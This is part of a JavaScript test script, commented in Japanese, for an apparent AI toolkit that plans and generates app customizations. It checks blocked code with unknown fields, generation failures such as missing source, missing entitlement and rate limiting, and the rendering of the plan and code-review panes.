  assert(v && v.final && FS.readyOf(v) === false && m.calls2.generate.length === 0 && /Toolkit では JavaScript を作れない部分があります: 承認後（完了）は金額を編集できなくする（PC かモバイルかが未定）/.test(fin) && !/問題は見つかりませんでした/.test(fin), `最終案のカード: 作れない理由（PC かモバイルかが未定）を出し、承認できない（生成工程は呼ばない）: ${fin.slice(fin.indexOf('実現できない点'), fin.indexOf('実現できない点') + 160)}`);
  const g = await m.panel.send('コードを作って');
  assert(g.ok === false && m.calls2.generate.length === 0 && m.msgs().some(x => x.data?.kind === 'generate-not-needed') && !/\bC1\b/.test(m.chat().replace(/<details[\s\S]*?<\/details>/g, '').replace(/data-[a-z-]+="[^"]*"/g, '')), '生成不可の JavaScript は「コードを作って」でも Generator を呼ばない（理由は最終案の「実現できない点」。カスタマイズの番号は出さない）');
}
{
  // BLOCKED なコード（未知フィールド）→ 採用不可
  const NEW_JS_CUST_V = () => cust({ ...NEW_JS_CUST(), fields: [{ code: 'amount', access: 'CONTROL', condition: 'amount >= 1000000', effects: ['warn'] }] });
  const PLAN_NEW_JS_V = planOf({ steps: [JS_STEP('C1', { title: '金額が100万円以上なら警告メッセージを表示（JavaScript）', targetRef: null })], customizations: [NEW_JS_CUST_V()], solution: 'CUSTOMIZATION', goal: '金額が100万円以上なら警告メッセージを表示したい' });
  //   簡素化 B（2026-10-17）: 生成のときの未知のフィールドは、生成工程の機械検査（fields。review）と模擬テスト（未知のフィールドの .value で例外 → 不合格）で扱う。
  //   Toolkit の形式確認は生成のときに作り直さない（以前の期待: Toolkit の GENERATED_JS_UNKNOWN_FIELD）。偽の生成工程は本物と同じ形の結果を返す
  const m = mountV({ inputs: INPUTS_PLAIN, planResponse: PLAN_NEW_JS_V, generatedFor: () => genNew(NEW_JS_GOOD.replace("record['amount'].value", "record['amount_total'].value")), has: { amount: ['warn'] }, fails: ['amount|warn'], failMsg: '金額が 100 万円以上なら警告するはずが、生成したコードが例外で止まりました',
    verify: (ver) => ({ ...ver, passed: false, machine: [...ver.machine, { name: 'fields', ok: false, severity: 'review', message: 'アプリに無いフィールドコードをコードで参照しています: 「amount_total」' }] }) });
  await ticks();
  const v = await K.adoptOnScreen(m);
  const fin = finalText(m);
  assert(/設定の変更はありません/.test(m.$('kt-ai-change-summary').innerHTML) && /新しい JavaScript「amountWarning\.js」を登録/.test(m.$('kt-ai-change-summary').innerHTML) && v.plan.solution === 'CUSTOMIZATION', '新規 JS の計画: 最終案のカードは「設定の変更はありません」・新しい JavaScript を登録（右の「変更内容」）・solution CUSTOMIZATION');
  assert(m.calls2.generate.length === 1 && m.panel.generated('C1').review.status === 'BLOCKED' && m.panel.generated('C1').review.checks.some(x => x.name === 'behavior-fail' && !x.ok) && m.panel.generated('C1').review.checks.some(x => x.name === 'fields' && x.gateway && !x.ok), `Generator の応答に未知フィールド → 生成工程の結果（模擬テストの不合格・fields の確認）で BLOCKED: ${JSON.stringify(m.panel.generated('C1').review.checks.filter(x => !x.ok).map(x => x.name))}`);
  m.panel.showCode('C1', { view: 'code' });
  assert(FS.readyOf(v) === false && /模擬テストで、必須の動作のとおりに動きませんでした/.test(fin) && /計画か実装仕様/.test(fin) && /× /.test(m.$('kt-ai-code-review').innerHTML) && /アプリに無いフィールドコード/.test(m.$('kt-ai-code-review').innerHTML), `最終案のカード: 承認できない・次の方針（計画か実装仕様を見直す）。理由（生成工程の fields の確認）は右の「コード」。登録ボタンは出ない: ${FS.readyOf(v)} ${String(fin).replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').slice(0, 400)}`);
  await clickCode(m, 'kt-ai-code-copy');
  assert(m.copies.length === 1, 'BLOCKED でもコードの確認（コピー）はできる（登録はしない）');
}

// =========================================================
console.log('\n--- §53-3. 統合先の本文を取得できない / 契約に無い / Gateway エラー / 標準設定だけ ---');
{
  let available = false;
  const m = mountV({ inputs: INPUTS_CACHED, downloadFails: (name) => name === 'common.js' || (name === 'fieldOnOff.js' && !available) });
  await ticks();
  const v = await K.adoptOnScreen(m);
  assert(v.review.steps.find(r => r.solution === 'CUSTOMIZATION').codeGeneration.sourceAvailable === false && v.review.steps.find(r => r.solution === 'CUSTOMIZATION').codeGeneration.supported === true, 'キャッシュ payload: 本文なし（生成は試みる）');
  // 2026-10-06: 会話は利用者の言葉だけ（JS_SOURCE_UNAVAILABLE の文字は出さない。失敗の理由は生成結果に残る）
  const fin = finalText(m);
  assert(m.calls2.generate.length === 0 && v.generated.C1.status === 'failed' && v.generated.C1.failure.reason === 'JS_SOURCE_UNAVAILABLE' && FS.readyOf(v) === false && /JavaScript を生成できませんでした: 統合先の既存の JavaScript の本文を取得できませんでした/.test(fin) && !/JS_SOURCE_UNAVAILABLE/.test(m.chat()), '本文を取得できない: Generator を呼ばず（既存ファイルへの推測の生成はしない）、最終案のカードに取得できない旨（内部の名前 JS_SOURCE_UNAVAILABLE は会話に出さない）・承認できない');
  // 本文を取得できるようになったら、「コードを作って」（最終案の作り直し）で同じカスタマイズのコードを生成する
  available = true;
  const g = await m.panel.send('コードを作って'); await ticks(8);
  const v2 = m.conv().activePlan();
  assert(g.intent === KTAiConversation.INTENT.GENERATE_CODE && m.calls2.generate.length === 1 && m.calls2.generate[0].ctx.existingFile?.source === FIELD_ON_OFF && !!m.panel.generated('C1', v2)?.generated && !m.panel.generated('C1', v2).review.checks.some(c => !c.ok && c.name !== 'behavior-not-run'), '本文を取得できる → 「コードを作って」で同じカスタマイズのコードを生成（Toolkit の形式確認で問題なし）');
  //   キャッシュの解析（本文なし）では、同じ画面の既存 JS（common.js）の本文も模擬テストに渡せない。新しい流れでは、これをコードの誤りとせず「対応できない範囲」で準備未完了にする
  assert(v2.generated.C1.status === 'not-run' && v2.generated.C1.verdict.reasonKey === 'related-file-omitted' && /common\.js/.test(v2.generated.C1.verdict.reason) && FS.readyOf(v2) === false, `同じ画面の既存 JS を模擬テストに渡せない → 準備未完了（コードの誤りとはしない）: ${JSON.stringify(v2.generated.C1.verdict && { kind: v2.generated.C1.verdict.kind, key: v2.generated.C1.verdict.reasonKey })}`);
}
{
  const h = K.clone(HEALTH_V); h.entitlements = [{ product: 'toolkit', features: ['assistant-qa', 'change-planner'] }];
  const m = mountV({ health: h });
  await ticks();
  const v = await K.adoptOnScreen(m);
  const fin = finalText(m);
  assert(m.calls2.generate.length === 0 && v.generated.C1.status === 'failed' && v.generated.C1.failure.reason === 'GENERATOR_NOT_AVAILABLE' && /JavaScript の生成」を利用できません/.test(fin) && FS.readyOf(v) === false, '契約に customization-generator が無い: GENERATOR_NOT_AVAILABLE（Generator を呼ばない。Planner / Q&A は使える）');
  // 2026-10-06: エラーの番号は本文に出さない（[CODE] の形では出さない）
  assert(!/\[GENERATOR_NOT_AVAILABLE\]/.test(m.chat()) && !/GENERATOR_NOT_AVAILABLE/.test(fin), '最終案のカード: GENERATOR_NOT_AVAILABLE の番号は本文に出さない');
  assert(m.panel.capability().features['customization-generator']?.available === false && m.panel.capability().features['change-planner']?.available === true, 'capability: generator だけ利用不可');
}
{
  let fail = true;
  const m = mountV({ generatedFor: (ctx) => { if (fail) throw new KTAiClient.AiClientError({ code: KTAiClient.ERROR_CODES.RATE_LIMITED, message: 'rate', retryAfterSeconds: 30, requestId: 'gen-x' }); return genPatch({ ...PATCH_GOOD, baseHash: ctx.existingFile?.hash || PATCH_GOOD.baseHash }); } });
  await ticks();
  const v = await K.adoptOnScreen(m);
  const fin = finalText(m);
  //   §0f.3 の 1（2026-10-09）: RATE_LIMITED はこの送信を止める失敗（rate）。最終案は未完成で、止めた理由と次の手（［残りの JavaScript を作る］= もう一度作る）を出す
  assert(m.calls2.generate.length === 1 && v.generated.C1.status === 'failed' && v.generated.C1.failure.reason === 'RATE_LIMITED' && v.generated.C1.failure.stop === 'rate' && !v.generated.C1.generated && FS.readyOf(v) === false && v.final.incomplete && v.final.incomplete.kind === 'rate' && /作成途中/.test(fin) && /の作成中に、AIサービスへのアクセスが集中しています。/.test(fin) && /残りの JavaScript を作る/.test(fin), `Gateway の RATE_LIMITED: 作成途中のカードに止めた理由と次の操作（もう一度作る。2026-10-14 の設計し直しの文）。生成結果は無い・承認できない: ${fin.replace(/\n+/g, ' ⏎ ').slice(0, 300)}`);
  assert(!/RATE_LIMITED/.test(fin), '最終案のカード: RATE_LIMITED の番号は本文に出さない');
  assert(writes(m).length === 0, 'エラー時も書き込み 0 件');
  fail = false;
  const g = await m.panel.send('コードを作って'); await ticks(8);
  assert(g.intent === KTAiConversation.INTENT.GENERATE_CODE && m.calls2.generate.length === 2 && m.conv().activePlan().generated.C1.status === 'verified', '再試行は「コードを作って」（GENERATE_CODE。最終案の作り直し）で生成工程をもう一度呼ぶ');
}
{
  const m = mountV({ planResponse: PLAN_STD });
  await ticks();
  await K.adoptOnScreen(m);
  const g = await m.panel.send('コードを作って');
  assert(g.intent === KTAiConversation.INTENT.GENERAL && g.reason === 'NO_CUSTOMIZATION' && m.calls2.generate.length === 0, '標準設定だけの計画で「コードを作って」: カスタマイズが無い（GENERAL）');
  assert(/JavaScript カスタマイズはありません/.test(m.chat()) && !/JavaScript の状態|<li><span>[^<]*（JavaScript）/.test(m.$('kt-ai-change-summary').innerHTML), '標準のみの計画は右の「変更内容」に JavaScript の段なし。「コードを作って」には「カスタマイズはありません」と答える');
}

// =========================================================
console.log('\n--- §53-4. KTAiChatUi（純関数）---');
{
  const hy = reviewPlan(PLAN_HYBRID);
  const v = { planId: 'p', version: 1, status: 'ACTIVE', goal: GOAL_HYBRID, plan: hy.plan, review: hy.review, generated: {} };
  // Phase 19: カスタマイズの詳細は実装仕様カード（右の「変更内容」）に一本化。
  //   C-1 第 3 段: 右の仕様は閲覧だけ（［この仕様で確定］は削除: ai-flow-redesign F7-3）。会話の仕様のカード（specChatCardHtml）は削除（F7-2）
  const vSpec = { ...v, spec: { specId: 'p:spec', version: 1, status: 'DRAFT', customizations: hy.plan.customizations } };
  const card = KTAiChatUi.specCardHtml(vSpec);
  assert(/生成可/.test(card) && /✎ fieldOnOff\.js を変更/.test(card) && !/data-act="confirm-spec"/.test(card), 'specCardHtml（右）: 生成可バッジ・統合先（閲覧だけ）');
  const cardNew = KTAiChatUi.specCardHtml({ planId: 'p', version: 1, status: 'ACTIVE', plan: PLAN_NEW_JS.plan, review: null, spec: { specId: 'p:spec', version: 1, status: 'DRAFT', customizations: [NEW_JS_CUST()] } });
  assert(/＋ 新規 JS/.test(cardNew) && /追加画面/.test(cardNew) && !/app\.record\./.test(cardNew), 'specCardHtml（新規 JS）: イベントは画面の名前で出す（§0e.3）');
  //   簡素化 §5（2026-10-16）: 同じフィールドを扱う既存 JS は通常表示に「既存 JS との競合」と出さない（詳しくの中に、ファイルとフィールドの名前と確かめ方だけ）
  const nwS = reviewPlan(PLAN_NEW_JS);
  const cardShared = KTAiChatUi.specCardHtml({ planId: 'p', version: 1, status: 'ACTIVE', plan: nwS.plan, review: nwS.review, spec: { specId: 'p:spec', version: 1, status: 'DRAFT', customizations: nwS.plan.customizations } }, { labels: { amount: '金額' } });
  const sharedAt = cardShared.indexOf('同じフィールドを扱う既存の JavaScript');
  assert(!/既存 JS との競合|競合/.test(cardShared) && sharedAt > 0 && cardShared.lastIndexOf('<details', sharedAt) > cardShared.lastIndexOf('</details>', sharedAt) && /fieldOnOff\.js（「金額」）/.test(cardShared),
    `specCardHtml: 同じフィールドを扱う既存 JS は詳しくの中だけ（競合と書かない）: ${cardShared.replace(/<[^>]+>/g, ' ').replace(/\s+/g, ' ').slice(0, 300)}`);
  //   会話のコードのカード（MSG.CODE・codeCardHtml）は削除した（F7-1・F7-2）。検査の一覧は右の「コード」（codePaneHtml）
  //   簡素化 B（2026-10-17）: 検査の一覧は、Toolkit の統合の確認（patch）と、生成工程の機械検査の項目（本物と同じ名前。ここでは構文と安全）を合わせたもの
  const rv = KTCodeReview.attachBehavior(KTCodeReview.review({ generated: genPatch(), customization: hy.plan.customizations[0], plan: hy.plan, data: INPUTS.data, scan: INPUTS.scan, existingSource: SRC }),
    { version: '1', candidateHash: '0123456789abcdef', passed: true, machine: [{ name: 'syntax', ok: true, severity: 'info', message: '既存ファイルに patch を合成した全文が構文解析を通りました' }, { name: 'patch', ok: true, severity: 'info', message: 'patch の 1 件の操作は anchor が既存ファイルの本文に 1 回だけ現れます' }, { name: 'security', ok: true, severity: 'info', message: '秘密情報の直書き・外部への通信・eval はありません' }], requiredEffects: [], behavior: { status: 'not-run', reason: 'no-required-effects', cases: [] } },
    { requiredEffects: [], customization: hy.plan.customizations[0] });
  assert(rv.checks.filter(x => x.name === 'patch').length === 1 && rv.checks.some(x => x.name === 'patch' && !x.gateway && /元のコードは保持/.test(x.message)), '生成工程の patch の合格は、Toolkit の統合の行と重ねない（同じ事実）');
  v.generated.C1 = { generated: genPatch(), review: rv, existingSource: SRC };
  assert(/✎ 既存 JS を変更: /.test(KTAiChatUi.codePaneHtml(v.generated.C1).head) && !/検査を通過/.test(KTAiChatUi.codePaneHtml(v.generated.C1).head) && /✓ 既存ファイルへの統合/.test(KTAiChatUi.codePaneHtml(v.generated.C1).review) && /✓ 構文/.test(KTAiChatUi.codePaneHtml(v.generated.C1).review), 'codePaneHtml: 見出しは方針とファイル（判定の札は出さない）。検査の ✓ 一覧（Toolkit の統合の確認と生成工程の項目。検査名は日本語）は review');
  const pane = KTAiChatUi.codePaneHtml(v.generated.C1, { view: 'diff' });
  assert(pane.code === rv.finalCode && /^\+/m.test(pane.diff) && /fieldOnOff\.js/.test(pane.head), 'codePaneHtml: code / diff / head');
  //   簡素化 §5（2026-10-16）: 通った検査（✓ の記録）は［詳しく］の中。止める・確かめる必要のある検査（× △）は［詳しく］の外に出す（表示だけ。判定は変えない）
  const outsideDetails = (h) => String(h).replace(/<details[\s\S]*?<\/details>/g, '');
  const rvMixed = { ...rv, checks: [...rv.checks, { name: 'apis', ok: false, severity: 'review', message: '確かめてください（テスト）' }] };
  const paneMixed = KTAiChatUi.codePaneHtml({ ...v.generated.C1, review: rvMixed });
  assert(!/✓/.test(outsideDetails(pane.review)) && /<details class="kt-ai-tech kt-ai-code-passed"><summary>通った検査（\d+ 件）<\/summary>/.test(pane.review) && /✓ 構文/.test(pane.review)
    && /△ 使う API: 確かめてください（テスト）/.test(outsideDetails(paneMixed.review)) && !/✓/.test(outsideDetails(paneMixed.review)),
    `codePaneHtml: 通った検査は［詳しく］の中・確かめる必要のある検査は外: ${outsideDetails(paneMixed.review).replace(/<[^>]+>/g, ' ').slice(0, 200)}`);
  assert(KTAiChatUi.STRATEGY_JA.EXTEND_EXISTING_JS === '✎ 既存 JS を変更' && KTAiChatUi.STRATEGY_JA.NEW_JS_FILE === '＋ 新規 JS', 'STRATEGY_JA');
}

console.log(`\n${state.failed ? 'FAILED' : 'ALL PASSED'}: ${state.passed} passed / ${state.failed} failed`);
process.exit(state.failed ? 1 : 0);
})().catch(e => { console.error(e); process.exit(1); });
